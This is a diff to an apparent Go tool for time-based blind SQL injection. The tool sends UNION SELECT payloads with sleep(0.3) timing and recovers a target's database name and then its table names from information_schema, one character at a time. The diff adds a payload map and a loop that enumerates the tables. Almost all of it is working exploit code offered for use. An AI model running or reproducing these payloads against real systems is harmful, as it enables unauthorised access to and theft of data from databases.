@@ -55,8 +55,12 @@ func makeRequest(payload string) {
 }
 
 func handle() {
-	databaseName := exploitDatabase("' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #")
-	fmt.Printf("%v\n[✔] Database's name found: %v %v\n", Green, databaseName, EndColor)
+	database := Database{}
+
+	payloads := getPayload()
+	databaseName := exploit(payloads["find_database_name"], 0, database)
+
+	fmt.Printf("%v\n[✔] Database's name found: %v %v %v %v\n", Green, EndColor, Yellow, databaseName, EndColor)
 
 	var choice string
 	fmt.Print("\nDo you want to continue to exploit tables? [Y/n]: ")
@@ -65,7 +69,12 @@ func handle() {
 	if strings.ToLower(choice) == "y" {
 		database := Database{"tables", databaseName, "", ""}
 		tablesNumber := getValueFields(database)
-		fmt.Println(tablesNumber)
+
+		for i := range tablesNumber {
+			tableName := exploit(payloads["find_table_name"], i, database)
+			fmt.Printf("%v\n[✔] Table found: %v %v %v %v\n", Green, EndColor, Yellow, tableName, EndColor)
+
+		}
 	} else {
 		fmt.Println("Exiting...")
 		os.Exit(0)
@@ -103,7 +112,7 @@ func getValueFields(db Database) int {
 	return 0
 }
 
-func exploitDatabase(payload string) string {
+func exploit(payload string, i int, database Database) string {
 	item := 1
 	name := ""
 	total_strings_verified := 0
@@ -112,6 +121,8 @@ func exploitDatabase(payload string) string {
 		for _, current_value := range Strings {
 			payloadFormatted := regexp.MustCompile(`\{index\}`).ReplaceAllString(payload, strconv.Itoa(item))
 			payloadFormatted = regexp.MustCompile(`\{value\}`).ReplaceAllString(payloadFormatted, string(current_value))
+			payloadFormatted = regexp.MustCompile(`\{limit\}`).ReplaceAllString(payloadFormatted, strconv.Itoa(i))
+			payloadFormatted = regexp.MustCompile(`\{database_name\}`).ReplaceAllString(payloadFormatted, database.DatabaseName)
 
 			start := time.Now()
 			makeRequest(payloadFormatted)
@@ -138,6 +149,15 @@ func exploitDatabase(payload string) string {
 			}
 		}
 	}
+}
+
+func getPayload() map[string]string {
+	payload := map[string]string{
+		"find_database_name": "' or 1=1 union select 1, 2, if(substring((select database()), '{index}', 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #",
+		"find_table_name":    "' or 1=1 union select 1, 2, if(substring((select table_name from information_schema.tables where table_schema = '{database_name}' limit {limit},1), {index}, 1)='{value}' , sleep(0.3), NULL), 4, 5, 6; #",
+	}
+
+	return payload
 }
 
 func main() {
